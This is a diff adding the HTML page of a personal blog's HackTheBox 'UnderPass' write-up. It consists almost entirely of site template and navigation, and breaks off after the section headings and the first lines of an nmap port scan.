@@ -1,0 +1,1606 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Hackthebox - UnderPass &middot; Re-toor</title>
+    <meta name="title" content="Hackthebox - UnderPass &middot; Re-toor">
+  
+
+  
+  
+  
+    <meta name="keywords" content="web,linux,ssh,snmp,daloradius,mosh,cron,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/ctf/hackthebox/underpass/">
+  
+
+  
+  
+    <meta name="author" content="TAH">
+  
+  
+    
+      
+        
+          <link href="https://github.com/re-toor" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/ha-tuan-anh" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/ctf/hackthebox/underpass/">
+  <meta property="og:site_name" content="Re-toor">
+  <meta property="og:title" content="Hackthebox - UnderPass">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-02-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-01T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Ssh">
+    <meta property="article:tag" content="Snmp">
+    <meta property="article:tag" content="Daloradius">
+    <meta property="article:tag" content="Mosh">
+    <meta property="og:image" content="http://localhost:1313/ctf/hackthebox/underpass/feature.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/ctf/hackthebox/underpass/feature.png">
+  <meta name="twitter:title" content="Hackthebox - UnderPass">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+    <meta name="google-site-verification" content="1SrZKSHd82TJBbAQUQHiETfCL9gFqP0JneGjCV7VgHk">
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.dee52a50de99867dcf702b61813409684375e1531029925e3bf93a18ce5e9b90966dda9f19fd79daeca29df901c7b5408766f123540a0db92714d31fe7c3bdb1.css"
+    integrity="sha512-3uUqUN6Zhn3PcCthgTQJaEN14VMQKZJeO/k6GM5em5CWbdqfGf152uyinfkBx7VAh2bxI1QKDbknFNMf58O9sQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
+      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Ctf",
+    "name": "Hackthebox - UnderPass",
+    "headline": "Hackthebox - UnderPass",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost:1313/ctf/hackthebox/underpass/",
+    "author" : {
+      "@type": "Person",
+      "name": "TAH"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-02-01T00:00:00\u002b00:00",
+    "datePublished": "2025-02-01T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-02-01T00:00:00\u002b00:00",
+    
+    "keywords": ["web","linux","ssh","snmp","daloradius","mosh","cron"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1882"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "HackTheBox",
+            "item": "http://localhost:1313/ctf/hackthebox/"
+          },{
+            "@type": "ListItem",
+            "position":  2 ,
+            "name": "Ctf",
+            "item": "http://localhost:1313/ctf/"
+          },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "name": "Hackthebox - UnderPass",
+        "item": "http://localhost:1313/ctf/hackthebox/underpass/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Re-toor
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/blog/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="Blog">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/soc/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="SOC"
+      title="SOC">
+      
+      
+        <span class="text-base font-medium break-normal">
+          SOC
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/ctf/"
+            
+          
+          aria-label="CTF"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Ctf">
+          
+          <span class="text-bg font-bg break-normal" title="Ctf">
+            CTF
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/ctf/hackthebox/"
+                
+                aria-label="HackTheBox"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="HackTheBox">
+                  HackTheBox
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/tryhackme/"
+                
+                aria-label="TryHackMe"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="TryHackMe">
+                  TryHackMe
+                </span>
+              </a>
+            
+              <a
+                href="/ctf/selfdev/"
+                
+                aria-label="Self-dev"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Self-dev">
+                  Self-dev
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+      
+  
+    <a
+      href="/about/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="About">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/blog/"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Blog" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/soc/"
+        aria-label="SOC"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="SOC" class="text-2xl font-bold tracking-tight">
+          SOC
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/ctf/"
+        aria-label="CTF"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="Ctf" class="text-2xl font-bold tracking-tight">
+          CTF
+        </span>
+        
+          <label
+            for="fullscreen-submenu-ctf"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-ctf" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/ctf/hackthebox/"
+                  aria-label="HackTheBox"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="HackTheBox" class="text-lg">
+                    HackTheBox
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/tryhackme/"
+                  aria-label="TryHackMe"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="TryHackMe" class="text-lg">
+                    TryHackMe
+                  </span>
+                </a>
+              
+                <a
+                  href="/ctf/selfdev/"
+                  aria-label="Self-dev"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Self-dev" class="text-lg">
+                    Self-dev
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/about/"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="About" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/ctf/hackthebox/underpass/feature_hu_e8b6599a394f313.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/ctf/hackthebox/underpass/feature_hu_e8b6599a394f313.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hackthebox - UnderPass
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-02-01T00:00:00&#43;00:00">1 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1882 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a></li>
+    <li><a href="#ssh-and-user-flag">SSH and User flag</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance-and-scanning">Reconnaissance and Scanning</a></li>
+    <li><a href="#enumeration-and-gaining-access">Enumeration and Gaining access</a></li>
+    <li><a href="#ssh-and-user-flag">SSH and User flag</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h2 class="relative group">Reconnaissance and Scanning
+    <div id="reconnaissance-and-scanning" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconnaissance-and-scanning" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea <span class="o">(</span>ECDSA<span class="o">)</span>
